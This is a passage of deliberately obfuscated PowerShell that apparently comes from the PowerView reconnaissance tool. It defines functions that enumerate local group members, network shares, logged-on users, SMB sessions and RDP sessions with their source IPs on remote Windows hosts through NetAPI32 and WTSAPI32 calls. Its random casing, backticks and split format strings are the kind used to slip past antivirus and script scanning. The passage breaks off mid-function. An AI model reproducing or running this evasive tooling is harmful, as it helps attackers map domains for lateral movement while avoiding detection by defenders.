                if(${LI`s`Tg`RouPs}) {
                    
                    ${coM`PUt`Er} = [ADSI]"WinNT://$Server,computer"

                    ${CoM`PUT`Er}."P`SbASE"."CHI`Ld`REn" | &("{3}{0}{1}{2}"-f're-Ob','j','ect','Whe') { ${_}."pS`BASe"."s`chEMaCl`A`sSnA`mE" -eq ("{0}{1}" -f 'gro','up') } | &("{3}{1}{2}{0}" -f'ch-Object','o','rEa','F') {
                        ${gR`ouP} = &("{2}{1}{0}" -f'bject','-O','New') ("{2}{1}{0}"-f 'bject','O','PS')
                        ${G`Ro`Up} | &("{1}{2}{0}"-f 'Member','A','dd-') ("{1}{2}{0}{3}"-f 'op','Not','epr','erty') ("{2}{0}{1}" -f'rve','r','Se') ${SeRV`eR}
                        ${gRO`UP} | &("{2}{1}{0}"-f 'mber','d-Me','Ad') ("{1}{2}{0}" -f'y','Notep','ropert') ("{0}{1}" -f 'Grou','p') (${_}."N`Ame"[0])
                        ${GRO`UP} | &("{1}{2}{0}" -f 'mber','Add','-Me') ("{1}{3}{0}{2}"-f 'prop','Not','erty','e') 'SID' ((&("{0}{2}{1}"-f 'N','t','ew-Objec') ("{5}{6}{0}{7}{4}{2}{1}{3}" -f'rincip','y','urit','Identifier','l.Sec','System','.Security.P','a') ${_}."Ob`JectsId"[0],0)."VA`Lue")
                        ${gr`oUP} | &("{2}{1}{0}"-f 'ember','dd-M','A') ("{0}{1}{2}"-f'Note','prope','rty') ("{1}{0}{2}" -f 'scr','De','iption') (${_}."deSCRip`Ti`on"[0])
                        ${gR`OuP}
                    }
                }
                else {
                    
                    ${meM`B`ErS} = @($([ADSI]"WinNT://$Server/$GroupName")."pS`Base"."I`N`VOKE"(("{0}{1}" -f 'Memb','ers')))

                    ${M`eM`BeRs} | &("{1}{4}{3}{0}{2}" -f'ec','ForEach','t','j','-Ob') {

                        ${M`eMber} = &("{1}{0}{2}" -f 'ew-','N','Object') ("{1}{2}{0}"-f 'bject','P','SO')
                        ${mEM`B`Er} | &("{3}{2}{0}{1}"-f 'emb','er','d-M','Ad') ("{0}{3}{2}{1}" -f 'No','ty','proper','te') ("{0}{1}" -f'Se','rver') ${Se`RVer}

                        ${A`Ds`pATH} = (${_}.("{0}{1}"-f 'G','etType').Invoke().("{2}{0}{1}"-f'n','vokeMember','I').Invoke(("{1}{0}"-f'path','Ads'), ("{0}{1}{2}{3}" -f'G','e','tPro','perty'), ${n`UlL}, ${_}, ${N`Ull})).("{1}{0}" -f 'ce','Repla').Invoke(("{0}{1}{2}" -f 'W','inNT','://'), '')

                        
                        ${N`AMe} = &("{1}{2}{4}{0}{3}{5}"-f 'NT4t','Co','nve','oCanoni','rt-','cal') -ObjectName ${aD`spa`TH}
                        if(${Na`Me}) {
                            ${f`QDN} = ${N`Ame}.("{1}{0}" -f 't','spli').Invoke("/")[0]
                            ${OBjNA`Me} = ${aDsP`A`Th}.("{0}{1}"-f 's','plit').Invoke("/")[-1]
                            ${na`Me} = "$FQDN/$ObjName"
                            ${ISd`omA`IN} = ${t`Rue}
                        }
                        else {
                            ${na`ME} = ${ad`sPaTH}
                            ${i`SD`oMain} = ${FAL`sE}
                        }

                        ${me`mBEr} | &("{0}{2}{1}" -f'Add-','mber','Me') ("{2}{1}{0}{3}" -f 'p','e','Not','roperty') ("{2}{1}{0}{3}" -f'tN','coun','Ac','ame') ${na`Me}

                        
                        ${M`embEr} | &("{1}{2}{0}" -f'er','Ad','d-Memb') ("{2}{1}{0}" -f'rty','prope','Note') 'SID' ((&("{1}{2}{0}"-f'ject','New-O','b') ("{3}{7}{0}{4}{1}{5}{6}{2}"-f 'cipal','curityIden','r','System.S','.Se','tifi','e','ecurity.Prin')(${_}.("{1}{0}"-f'pe','GetTy').Invoke().("{2}{1}{0}" -f'er','b','InvokeMem').Invoke(("{1}{2}{0}"-f 'SID','Obj','ect'), ("{3}{0}{1}{2}"-f'o','pert','y','GetPr'), ${nu`lL}, ${_}, ${n`UlL}),0))."vAl`UE")

                        
                        
                        ${me`mb`eR} | &("{0}{2}{1}"-f'Add-M','r','embe') ("{1}{2}{3}{0}"-f 'perty','Not','epr','o') ("{2}{1}{0}"-f'ed','abl','Dis') $( if(-not ${isdo`Ma`IN}) { try { ${_}.("{1}{0}"-f 'pe','GetTy').Invoke().("{2}{3}{0}{1}"-f'eMembe','r','I','nvok').Invoke(("{0}{1}{2}"-f'AccountDis','able','d'), ("{1}{2}{0}"-f'rty','Get','Prope'), ${N`UlL}, ${_}, ${Nu`ll}) } catch { ("{1}{0}"-f'R','ERRO') } } else { ${F`A`lsE} } )

                        
                        ${i`sgr`oUp} = (${_}.("{1}{0}{2}"-f 'p','GetTy','e').Invoke().("{3}{0}{2}{1}" -f 'nvok','ber','eMem','I').Invoke(("{1}{0}" -f'ss','Cla'), ("{2}{1}{3}{0}" -f 'y','P','Get','ropert'), ${n`ULl}, ${_}, ${N`UlL}) -eq ("{0}{1}" -f'gr','oup'))
                        ${MeMB`eR} | &("{2}{0}{1}" -f'd-Mem','ber','Ad') ("{2}{0}{1}{3}"-f'oteproper','t','N','y') ("{0}{1}" -f 'IsGr','oup') ${isg`R`OUP}
                        ${M`e`mbER} | &("{2}{1}{0}" -f 'ber','-Mem','Add') ("{2}{1}{0}"-f'rty','pe','Notepro') ("{2}{0}{1}" -f'i','n','IsDoma') ${IS`DO`mAiN}
                        if(${IS`GrOuP}) {
                            ${me`mB`eR} | &("{1}{0}{2}"-f'M','Add-','ember') ("{1}{0}{2}"-f 'ropert','Notep','y') ("{0}{1}" -f'Las','tLogin') ""
                        }
                        else {
                            try {
                                ${M`eMb`er} | &("{2}{1}{0}" -f '-Member','d','Ad') ("{0}{1}{2}" -f 'Noteprope','r','ty') ("{0}{2}{1}"-f 'Las','gin','tLo') ( ${_}.("{1}{0}{2}" -f 'etTy','G','pe').Invoke().("{1}{0}{2}"-f'nvoke','I','Member').Invoke(("{1}{2}{0}" -f'Login','La','st'), ("{0}{1}{3}{2}" -f'GetPr','op','rty','e'), ${NU`LL}, ${_}, ${NU`ll}))
                            }
                            catch {
                                ${Me`m`BEr} | &("{1}{3}{2}{0}"-f'mber','Ad','Me','d-') ("{3}{1}{2}{0}" -f 'rty','op','e','Notepr') ("{1}{2}{0}"-f'n','Last','Logi') ""
                            }
                        }
                        ${M`eMb`Er}

                        
                        
                        if(${R`e`cUrse} -and ${isDO`M`A`In} -and ${Is`groUp}) {

                            ${f`QDn} = ${na`ME}.("{1}{0}"-f 'lit','sp').Invoke("/")[0]
                            ${Gr`oUPN`AmE} = ${n`Ame}.("{0}{1}"-f'spl','it').Invoke("/")[1].("{1}{0}" -f 'im','tr').Invoke()

                            &("{2}{4}{1}{0}{3}" -f'ro','etG','Get-','upMember','N') -GroupName ${Gro`UP`N`Ame} -Domain ${F`QDN} -FullData -Recurse | &("{0}{1}{3}{2}"-f 'For','Ea','bject','ch-O') {

                                ${M`EMBeR} = &("{0}{3}{1}{2}"-f 'N','w-Objec','t','e') ("{1}{2}{0}"-f't','PSObje','c')
                                ${m`EMBEr} | &("{1}{2}{0}"-f'r','Ad','d-Membe') ("{0}{1}{2}{3}"-f'No','tep','ropert','y') ("{0}{1}{2}" -f'Se','rv','er') "$FQDN/$($_.GroupName)"

                                ${me`MBe`RDN} = ${_}."Dis`T`iNgu`isheDN`Ame"
                                
                                ${meM`Be`R`doMA`In} = ${ME`Mb`e`RDn}.("{0}{1}{2}" -f 'subSt','rin','g').Invoke(${M`ember`dN}.("{2}{1}{0}"-f'f','exO','Ind').Invoke("DC=")) -replace 'DC=','' -replace ',','.'

                                if (${_}."SamaCc`o`Un`TTYPe" -ne ("{0}{2}{1}"-f '805','368','306')) {
                                    ${mEM`B`erI`sGrouP} = ${Tr`Ue}
                                }
                                else {
                                    ${meMb`E`RiSGrO`Up} = ${F`A`lsE}
                                }

                                if (${_}."Sa`m`ACco`Unt`NaMe") {
                                    
                                    ${me`MbE`RN`AME} = ${_}."SA`Ma`cCO`UntnaMe"
                                }
                                else {
                                    try {
                                        
                                        try {
                                            ${meMbeR`N`AMe} = &("{1}{0}{3}{2}"-f'v','Con','e','ert-SidToNam') ${_}."Cn"
                                        }
                                        catch {
                                            
                                            ${mEMbe`Rna`me} = ${_}."CN"
                                        }
                                    }
                                    catch {
                                        &("{1}{0}{2}{3}" -f'e-D','Writ','eb','ug') ('Error'+' '+'res'+'olvin'+'g '+'SID'+' '+': '+"$_")
                                    }
                                }

                                ${MeM`B`er} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{1}{2}{0}{3}"-f'rt','Notepr','ope','y') ("{1}{3}{2}{0}" -f 'me','A','tNa','ccoun') "$MemberDomain/$MemberName"
                                ${meMb`ER} | &("{0}{1}{2}" -f 'Ad','d-','Member') ("{1}{0}{2}"-f'proper','Note','ty') 'SID' ${_}."ObJEC`T`Sid"
                                ${me`MBeR} | &("{2}{0}{1}" -f 'dd-','Member','A') ("{1}{2}{0}" -f'ty','Notep','roper') ("{1}{2}{0}"-f'ed','Disa','bl') ${FA`lsE}
                                ${MeM`B`er} | &("{0}{1}{2}"-f'Add-','Membe','r') ("{1}{0}{2}" -f 'pr','Note','operty') ("{2}{1}{0}"-f 'roup','sG','I') ${m`e`mb`ErIs`GROuP}
                                ${meM`BeR} | &("{1}{0}{2}{3}" -f '-Me','Add','m','ber') ("{0}{2}{3}{1}" -f 'Not','roperty','e','p') ("{0}{2}{1}" -f 'IsDo','n','mai') ${Tr`UE}
                                ${mE`M`BER} | &("{1}{2}{0}"-f'Member','Add','-') ("{1}{0}{2}" -f 'epropert','Not','y') ("{2}{1}{0}" -f 'gin','o','LastL') ''
                                ${Me`m`BeR}
                            }
                        }
                    }
                }
            }
            catch {
                &("{1}{2}{0}"-f'g','Write-Wa','rnin') ('[!]'+' '+'E'+'rr'+'or: '+"$_")
            }
        }
    }
}


function gE`T-NetsH`A`Re {


    [CmdletBinding()]
    param(
        [Parameter(valUEFRoMpipeliNE=${T`RUe})]
        [Alias({"{0}{2}{1}"-f 'Ho','me','stNa'})]
        [String]
        ${Comput`Erna`Me} = ("{1}{2}{0}" -f't','l','ocalhos')
    )

    begin {
        if (${ps`B`oU`NdPara`M`EtERs}[("{0}{1}" -f'Deb','ug')]) {
            ${D`EBU`gPrEF`Er`EncE} = ("{1}{0}" -f'ue','Contin')
        }
    }

    process {

        
        ${C`oMput`ern`A`mE} = &("{1}{2}{0}" -f 'NameField','G','et-') -Object ${C`o`MpuTeR`N`Ame}

        
        ${qu`ErylEV`El} = 1
        ${pTR`iNFo} =   ${s`QG}::"Ze`Ro"
        ${ent`R`IEsR`ead} = 0
        ${TO`TaLre`Ad} = 0
        ${reS`UMeH`AN`DlE} = 0

        
        ${REs`U`lT} = ${neTa`pi32}::"NEtSHarEE`N`Um"(${C`O`mPUTE`RnAMe}, ${QuER`Yl`EVEl}, [ref]${PTr`I`Nfo}, -1, [ref]${EN`TrIEs`R`EAD}, [ref]${T`OT`Alre`Ad}, [ref]${RESUm`ehand`le})

        
        ${OF`Fs`ET} = ${Pt`RIn`Fo}.("{1}{0}{2}" -f 'Int','To','64').Invoke()

        &("{3}{0}{2}{1}"-f 'te-D','g','ebu','Wri') ('G'+'et-NetS'+'hare '+'result:'+' '+"$Result")

        
        if ((${r`esU`Lt} -eq 0) -and (${oF`F`Set} -gt 0)) {

            
            ${InCreM`E`Nt} = ${shA`R`E_inF`o`_1}::("{0}{1}" -f'GetS','ize').Invoke()

            
            for (${I} = 0; (${I} -lt ${e`NTriE`srE`AD}); ${I}++) {
                
                
                ${n`e`w`INtPtr} = &("{1}{2}{0}"-f'ct','New-Ob','je') ("{0}{1}{2}"-f 'System','.Intp','tr') -ArgumentList ${oF`Fset}
                ${iN`FO} = ${nE`w`InTptR} -as ${SharE_I`N`F`O_1}
                
                ${iN`Fo} | &("{0}{2}{1}{3}"-f 'S','lect-Objec','e','t') ('*')
                ${oF`F`SeT} = ${N`EWi`NTptr}.("{1}{0}" -f'Int64','To').Invoke()
                ${OF`FsET} += ${I`NcremE`NT}
            }

            
            ${n`UlL} = ${N`etAPI`32}::("{0}{2}{3}{1}"-f'N','erFree','etAp','iBuff').Invoke(${p`T`RiNFO})
        }
        else
        {
            switch (${rE`SU`lt}) {
                (5)           {&("{2}{1}{0}" -f 'e-Debug','t','Wri') ("{2}{3}{11}{5}{4}{10}{0}{9}{6}{7}{1}{8}" -f'requ','m','The use','r do','access ',' ','s','ted infor','ation.','e','to the ','es not have')}
                (124)         {&("{2}{1}{0}{3}"-f'-D','ite','Wr','ebug') ("{10}{11}{7}{6}{3}{8}{1}{5}{9}{12}{14}{4}{0}{13}{2}" -f'ot v','f','lid.','ifie','s n','or ','c','ue spe','d ','the level para','T','he val','meter','a',' i')}
                (87)          {&("{2}{0}{1}{3}"-f'i','te-Debu','Wr','g') ("{3}{6}{1}{2}{5}{4}{0}" -f '.','cified parameter is',' not va','The','d','li',' spe')}
                (234)         {&("{2}{1}{3}{0}" -f 'ebug','rite','W','-D') ("{13}{8}{10}{5}{2}{1}{4}{14}{9}{7}{15}{0}{12}{11}{3}{6}"-f 'to ','o','large en','ceive all e','ugh b','y a ','ntries.','fer','ries are available. Speci','f','f','e','r','More ent','u',' ')}
                (8)           {&("{0}{1}{2}"-f'Wr','ite-De','bug') ("{10}{4}{5}{1}{7}{6}{8}{2}{3}{9}{0}"-f'e.','n','aila','b','i','e','m','t me','ory is av','l','Insuffic')}
                (2312)        {&("{0}{1}{2}"-f 'Wr','ite','-Debug') ("{0}{7}{9}{2}{8}{6}{1}{3}{10}{5}{4}"-f 'A ',' exist with th','n ','e co','me.','er na','s not','sess','doe','io','mput')}
                (2351)        {&("{0}{2}{1}" -f'Write','g','-Debu') ("{1}{4}{3}{6}{9}{5}{8}{0}{7}{2}"-f 't v','The comp','d.','m','uter na','is ','e','ali','no',' ')}
                (2221)        {&("{1}{2}{0}{3}"-f 'e-Debu','Wri','t','g') ("{3}{0}{2}{1}{4}{5}" -f 'rname ','t fou','no','Use','n','d.')}
                (53)          {&("{2}{0}{1}"-f 'rite-Deb','ug','W') ("{3}{6}{4}{2}{0}{5}{1}" -f't',' found','d no','Hostn','e coul',' be','am')}
            }
        }
    }
}


function get-n`Et`Lo`gGEDOn {


    [CmdletBinding()]
    param(
        [Parameter(ValUEFromPIpELiNE=${tR`Ue})]
        [Alias({"{1}{0}"-f'Name','Host'})]
        [String]
        ${cO`mPUTe`R`NAmE} = ("{1}{3}{2}{0}" -f 't','loc','os','alh')
    )

    begin {
        if (${P`SB`o`U`NdpARaMetErS}[("{1}{0}" -f 'g','Debu')]) {
            ${D`EBuG`PRE`FerE`Nce} = ("{0}{2}{1}" -f'Co','e','ntinu')
        }
    }

    process {

        
        ${COmp`UtE`RnAme} = &("{2}{0}{1}" -f'Name','Field','Get-') -Object ${C`oMPUTEr`NA`mE}

        
        ${QUEr`YLEV`El} = 1
        ${P`TrInFO} =  (&("{0}{1}{2}"-f'vArIA','b','Le')  ("S"+"qg")  ).vaLUe::"Z`eRO"
        ${ent`RiEsr`Ead} = 0
        ${To`TAl`REaD} = 0
        ${R`ES`UmE`hANdlE} = 0

        
        ${reSU`lT} = ${NeTAP`I`32}::"nE`TW`kstAuseReNuM"(${COM`PU`TERN`Ame}, ${Qu`e`RY`leVEl}, [ref]${P`T`RInfO}, -1, [ref]${En`TRI`ESrE`Ad}, [ref]${tOTaL`R`EAD}, [ref]${r`e`s`UMeHandle})

        
        ${ofFS`et} = ${pt`RI`NFO}.("{0}{1}" -f'ToInt','64').Invoke()

        &("{3}{0}{2}{1}" -f'i','g','te-Debu','Wr') ('G'+'et-NetLogge'+'d'+'on '+'r'+'esult'+': '+"$Result")

        
        if ((${REsu`LT} -eq 0) -and (${OFF`set} -gt 0)) {

            
            ${I`Nc`Rem`enT} = ${WK`St`A_uS`Er_I`NFO_1}::("{0}{2}{1}"-f'G','tSize','e').Invoke()

            
            for (${I} = 0; (${i} -lt ${entRIes`R`e`Ad}); ${I}++) {
                
                
                ${n`e`W`intPtR} = &("{0}{1}{2}" -f'New','-','Object') ("{0}{2}{1}"-f'System','ntptr','.I') -ArgumentList ${O`FFsEt}
                ${IN`Fo} = ${n`E`w`inTPtR} -as ${WKs`T`A_U`SER_`InFO_1}

                
                ${i`NFO} | &("{4}{0}{1}{2}{3}" -f 'lect','-','O','bject','Se') ('*')
                ${O`F`FsEt} = ${NeWIn`Tp`TR}.("{1}{0}{2}" -f 'In','To','t64').Invoke()
                ${oFF`s`ET} += ${i`N`cR`eMeNT}

            }

            
            ${N`ULL} = ${N`E`T`ApI32}::("{2}{0}{1}{3}"-f 'u','ff','NetApiB','erFree').Invoke(${PTR`I`NFO})
        }
        else
        {
            switch (${reS`U`LT}) {
                (5)           {&("{0}{1}{2}{3}"-f 'Wri','te-De','bu','g') ("{0}{6}{11}{2}{10}{7}{13}{14}{4}{3}{15}{1}{5}{12}{9}{8}" -f'The us','d',' not hav','es','u',' i','er do','cess to','.','mation','e ac','es','nfor',' the r','eq','te')}
                (124)         {&("{1}{0}{2}{3}" -f 'te','Wri','-Deb','ug') ("{1}{5}{8}{0}{3}{2}{15}{10}{11}{14}{9}{6}{4}{7}{13}{12}" -f'e ','Th','pecified for the ','s','ot ','e va','ter is n','va','lu','arame','e','vel ','id.','l','p','l')}
                (87)          {&("{1}{0}{2}" -f 'ite-De','Wr','bug') ("{1}{6}{9}{7}{5}{3}{2}{4}{8}{0}" -f '.','The ','r ','amete','is ','ar','spec',' p','not valid','ified')}
                (234)         {&("{1}{3}{0}{2}"-f 'bu','Writ','g','e-De') ("{2}{8}{3}{6}{1}{11}{13}{0}{7}{10}{12}{4}{5}{9}"-f'enou','le. Specify a ','More entrie','av',' all e','ntrie','ailab','gh ','s are ','s.','buffer to rece','lar','ive','ge ')}
                (8)           {&("{2}{3}{0}{1}" -f'u','g','Wr','ite-Deb') ("{2}{1}{3}{0}{4}{5}" -f'nt memor','n','I','sufficie','y is a','vailable.')}
                (2312)        {&("{2}{1}{3}{0}"-f'ebug','ite-','Wr','D') ("{4}{1}{6}{0}{5}{7}{2}{8}{3}"-f 'h ','s not exist wi','ompute','e.','A session doe','the','t',' c','r nam')}
                (2351)        {&("{1}{0}{2}" -f 'it','Wr','e-Debug') ("{2}{4}{5}{1}{0}{3}{7}{6}" -f ' is not ','ame','The','va',' compute','r n','id.','l')}
                (2221)        {&("{2}{0}{1}"-f 'i','te-Debug','Wr') ("{4}{3}{0}{2}{5}{1}" -f 'me','und.',' not','rna','Use',' fo')}
                (53)          {&("{2}{1}{0}"-f '-Debug','rite','W') ("{1}{0}{2}{4}{3}" -f 'tnam','Hos','e coul','e found','d not b')}
            }
        }
    }
}


function GET-`NETsEsS`Ion {


    [CmdletBinding()]
    param(
        [Parameter(vaLuEFrOMpipELinE=${TR`Ue})]
        [Alias({"{1}{2}{0}"-f'e','HostN','am'})]
        [String]
        ${com`P`U`Ter`NamE} = ("{3}{2}{1}{0}" -f 't','s','o','localh'),

        [String]
        ${us`E`RnAme} = ''
    )

    begin {
        if (${pSBo`U`NdpARAMeTE`Rs}[("{1}{0}"-f'g','Debu')]) {
            ${d`Eb`UgprEFEre`N`cE} = ("{2}{1}{0}" -f 'e','ontinu','C')
        }
    }

    process {

        
        ${Co`mpute`Rn`AmE} = &("{1}{2}{0}{3}{4}"-f 'm','G','et-Na','e','Field') -Object ${CoM`PUt`ern`AmE}

        
        ${qU`E`RYlevEl} = 10
        ${pTri`NfO} =   ${S`QG}::"zE`RO"
        ${EN`TRieS`R`ead} = 0
        ${ToT`Alre`AD} = 0
        ${r`e`suM`EhAndLE} = 0

        
        ${r`ESUlT} = ${n`eTAP`i32}::"N`et`seSS`ioNEN`UM"(${ComPUT`e`R`NAMe}, '', ${uS`erN`AmE}, ${qUeRY`LE`VEL}, [ref]${p`TriN`FO}, -1, [ref]${e`N`Tri`esreAd}, [ref]${t`o`TalrE`Ad}, [ref]${ReSUMe`Ha`N`dlE})

        
        ${of`Fs`Et} = ${pT`R`INfo}.("{0}{1}"-f'ToInt6','4').Invoke()

        &("{0}{1}{2}"-f'Writ','e-De','bug') ('Get-N'+'etS'+'essio'+'n'+' '+'r'+'esul'+'t: '+"$Result")

        
        if ((${R`Es`UlT} -eq 0) -and (${oF`F`SeT} -gt 0)) {

            
            ${iNC`Re`mE`NT} = ${SEssi`O`N_InfO`_10}::("{1}{0}"-f'ize','GetS').Invoke()

            
            for (${I} = 0; (${I} -lt ${e`NtRi`e`Sread}); ${i}++) {
                
                
                ${n`EwinTP`Tr} = &("{0}{2}{1}"-f 'New-','ect','Obj') ("{0}{2}{1}{3}"-f'S','.Int','ystem','ptr') -ArgumentList ${ofF`SeT}
                ${i`NFo} = ${nEw`INt`p`TR} -as ${sESsi`On_infO`_`10}

                
                ${I`NfO} | &("{2}{0}{1}"-f'ect-Obj','ect','Sel') ('*')
                ${O`Ffs`et} = ${nEW`in`TpTr}.("{0}{2}{1}" -f 'T','t64','oIn').Invoke()
                ${o`F`FsEt} += ${inC`R`eMEnt}

            }
            
            ${N`ULL} = ${nE`TapI`32}::("{4}{1}{2}{0}{3}" -f'ferF','e','tApiBuf','ree','N').Invoke(${p`TRIN`FO})
        }
        else
        {
            switch (${R`e`sUlt}) {
                (5)           {&("{1}{2}{0}" -f 'ug','Wr','ite-Deb') ("{14}{7}{3}{6}{2}{8}{11}{13}{9}{10}{5}{0}{4}{1}{12}"-f 'he req','sted informat','r doe','s','ue','o t','e','u','s ',' ac','cess t','not hav','ion.','e','The ')}
                (124)         {&("{2}{1}{3}{0}"-f'g','-Deb','Write','u') ("{9}{13}{14}{8}{16}{1}{6}{10}{3}{7}{12}{0}{5}{11}{2}{4}{15}" -f'ter','or',' not vali','para','d',' i',' the ','m','ci','The','level ','s','e',' value',' spe','.','fied f')}
                (87)          {&("{2}{1}{0}"-f'ebug','ite-D','Wr') ("{2}{6}{10}{9}{4}{8}{7}{0}{1}{5}{3}" -f' n','ot v','The speci','id.','t','al','fi','r is','e','d parame','e')}
                (234)         {&("{3}{2}{0}{1}"-f'ebu','g','rite-D','W') ("{20}{19}{4}{15}{18}{8}{0}{5}{11}{9}{7}{6}{12}{3}{14}{17}{2}{16}{1}{10}{13}" -f'a lar',' all','eiv',' r',' avai','ge eno',' t','er',' Specify ','h buff',' ','ug','o','entries.','e','lable','e','c','.',' are','More entries')}
                (8)           {&("{0}{2}{1}" -f 'Write','g','-Debu') ("{6}{2}{3}{1}{5}{4}{0}" -f'lable.','nt memory i','ffi','cie','ai','s av','Insu')}
                (2312)        {&("{3}{1}{2}{0}"-f 'bug','ite','-De','Wr') ("{4}{11}{6}{3}{0}{7}{2}{8}{5}{1}{10}{9}" -f 'ot e','m','t ','n','A s','he co','oes ','xis','with t','name.','puter ','ession d')}
                (2351)        {&("{1}{2}{0}" -f 'e-Debug','Wr','it') ("{8}{6}{4}{2}{7}{5}{1}{0}{3}"-f 'ot vali',' is n','mputer n','d.',' co','e','e','am','Th')}
                (2221)        {&("{0}{2}{1}"-f'W','te-Debug','ri') ("{3}{1}{0}{2}"-f 'd','me not foun','.','Userna')}
                (53)          {&("{0}{1}{3}{2}"-f 'Wr','i','Debug','te-') ("{1}{7}{4}{0}{3}{2}{6}{5}" -f ' c','Host','no','ould ','e',' found','t be','nam')}
            }
        }
    }
}


function gE`T-NEtrdPseSS`i`ON {


    [CmdletBinding()]
    param(
        [Parameter(VaLuefROmPIpeliNE=${T`Rue})]
        [Alias({"{1}{0}"-f'me','HostNa'})]
        [String]
        ${co`Mpu`Te`RnAmE} = ("{2}{1}{3}{0}"-f't','h','local','os')
    )
    
    begin {
        if (${psbouNdPar`A`M`Et`eRs}[("{0}{1}" -f 'Debu','g')]) {
            ${d`EBug`prEf`eRen`cE} = ("{0}{2}{1}"-f'Cont','e','inu')
        }
    }

    process {

        
        ${comPUT`eRN`AMe} = &("{1}{2}{0}" -f'eld','Get-NameF','i') -Object ${cOMpu`TE`RNaME}

        
        ${h`AndlE} = ${WTS`APi`32}::("{0}{1}{2}{3}" -f 'WTS','Op','enSe','rverEx').Invoke(${CO`M`PutERNa`Me})

        
        if (${HAnD`Le} -ne 0) {

            &("{2}{1}{3}{0}" -f'bug','rit','W','e-De') ('W'+'TSO'+'pe'+'nServerEx '+'handle'+':'+' '+"$Handle")

            
            ${pPsESsIO`NIn`FO} =  ${s`qG}::"ZE`Ro"
            ${pco`U`NT} = 0
            
            
            ${RES`ULt} = ${w`Ts`API32}::"Wts`EN`UmE`Ra`TE`sESs`iOnsex"(${HA`NDlE}, [ref]1, 0, [ref]${pPs`EsSI`oni`N`FO}, [ref]${PC`Ount})

            
            ${O`F`FseT} = ${ppSesS`i`oN`i`NfO}.("{1}{0}"-f '4','ToInt6').Invoke()

            &("{0}{3}{1}{2}"-f 'Wri','Deb','ug','te-') ('WTSE'+'num'+'era'+'teSess'+'ionsE'+'x '+'r'+'esult: '+"$Result")
            &("{1}{2}{0}" -f 'te-Debug','W','ri') ('p'+'Count:'+' '+"$pCount")

            if ((${ResU`Lt} -ne 0) -and (${OffS`et} -gt 0)) {

                
                ${inCr`E`M`ENt} = ${WTS_s`ess`ION`_`inFO_1}::("{1}{2}{0}" -f 'e','GetS','iz').Invoke()

                
                for (${i} = 0; (${i} -lt ${PcO`Unt}); ${i}++) {
     
                    
                    
                    ${n`e`WiNTptr} = &("{2}{1}{0}"-f 'ct','Obje','New-') ("{1}{2}{3}{0}" -f 'tptr','Syst','em.I','n') -ArgumentList ${OfFS`eT}
                    ${I`NFO} = ${Ne`win`TP`Tr} -as ${wT`s_sessi`oN_`I`NfO_1}

                    ${R`DpsESs`iON} = &("{0}{2}{1}" -f'New','ect','-Obj') ("{1}{2}{0}" -f 't','PSOb','jec')

                    if (${iN`Fo}."pH`OsTnA`mE") {
                        ${R`D`pSEss`IOn} | &("{2}{1}{3}{0}" -f 'ber','d','A','d-Mem') ("{0}{1}{3}{2}"-f'Noteprop','er','y','t') ("{0}{1}{2}" -f'Compute','rNa','me') ${In`Fo}."P`hOSTn`Ame"
                    }
                    else {
                        
                        ${rdPs`e`S`sIoN} | &("{1}{0}{2}"-f 'dd-','A','Member') ("{0}{2}{1}"-f 'No','perty','tepro') ("{1}{0}{2}"-f 'a','ComputerN','me') ${C`O`MPut`ErnAME}
                    }

                    ${RdpseSS`i`oN} | &("{0}{2}{1}" -f'Add-Me','er','mb') ("{1}{0}{2}" -f 'r','Notep','operty') ("{1}{0}{2}"-f 'Na','Session','me') ${I`NFO}."pS`ESs`i`oNnamE"

                    if ($(-not ${In`Fo}."pDOma`in`NAMe") -or (${i`Nfo}."pDomAi`N`NaMe" -eq '')) {
                        
                        ${r`DpsES`s`iOn} | &("{2}{0}{1}"-f'd-Membe','r','Ad') ("{0}{3}{2}{1}"-f'Notep','rty','pe','ro') ("{2}{0}{1}"-f'erNam','e','Us') "$($Info.pUserName)"
                    }
                    else {
                        ${R`D`PsESSIoN} | &("{0}{1}{2}"-f'A','dd-Membe','r') ("{2}{1}{0}" -f 'perty','epro','Not') ("{0}{1}{2}"-f'Us','erNa','me') "$($Info.pDomainName)\$($Info.pUserName)"
                    }

                    ${rD`pSeSsi`On} | &("{1}{0}{2}" -f '-M','Add','ember') ("{3}{0}{1}{2}"-f 'oper','t','y','Notepr') 'ID' ${I`NfO}."Se`s`SIoniD"
                    ${rd`psE`ssioN} | &("{0}{1}{3}{2}"-f 'Ad','d-Me','r','mbe') ("{2}{1}{0}"-f 'ty','r','Noteprope') ("{0}{1}"-f'Sta','te') ${iN`FO}."s`TaTE"

                    ${p`p`BUFF`eR} =  (&('lS') vaRiABle:sQg).vaLUE::"z`ERO"
                    ${p`BYtEs`R`EtURNED} = 0

                    
                    
                    ${ReS`U`lT2} = ${WT`S`API`32}::"wtsQ`Ue`RYS`ES`s`iO`NIn`FOrmAtIOn"(${Ha`N`DlE}, ${I`NfO}."s`ES`Sio`NID", 14, [ref]${P`PBUFf`er}, [ref]${pB`YTEs`RE`Tu`RneD})

                    ${Of`Fset2} = ${pp`BUFfeR}.("{0}{1}" -f 'To','Int64').Invoke()
                    ${nEwiN`TP`TR2} = &("{0}{2}{1}"-f 'New','ct','-Obje') ("{2}{0}{3}{1}"-f'em.','r','Syst','Intpt') -ArgumentList ${OF`F`sEt2}
                    ${i`NfO2} = ${nE`wiNt`Pt`R2} -as ${w`TS_c`lI`enT_aDDrEsS}

                    ${SO`UrCE`ip} = ${iN`Fo2}."ADd`RESs"       
                    if(${s`OUr`ceIP}[2] -ne 0) {
                        ${SoU`RcE`iP} = [String]${sou`RC`eIP}[2]+"."+[String]${sou`R`ceip}[3]+"."+[String]${S`oUr`CEIp}[4]+"."+[String]${S`o`URCE`ip}[5]
                    }
                    else {
                        ${s`O`Urceip} = ${N`UlL}
                    }

                    ${Rd`Ps`esSION} | &("{0}{1}{2}" -f'Add-M','e','mber') ("{1}{2}{0}" -f'erty','N','oteprop') ("{0}{1}" -f'Sour','ceIP') ${s`OuRc`EiP}
                    ${Rdpses`s`Ion}

                    
                    ${Nu`LL} = ${w`TSapI`32}::("{0}{1}{2}"-f 'W','TSF','reeMemory').Invoke(${P`p`BuF`Fer})

                    ${OF`F`seT} += ${IN`C`RE`mENt}
                }
                
                ${nu`Ll} = ${wts`A`Pi`32}::("{1}{0}{2}{3}"-f 'r','WTSF','eeMem','oryEx').Invoke(2, ${pPsE`S`s`Io`NINfO}, ${pCO`U`NT})
            }
            
            ${n`Ull} = ${W`TSA`p`i32}::("{0}{3}{2}{1}" -f'WTS','seServer','o','Cl').Invoke(${haN`dLe})
        }
        else {
            
            
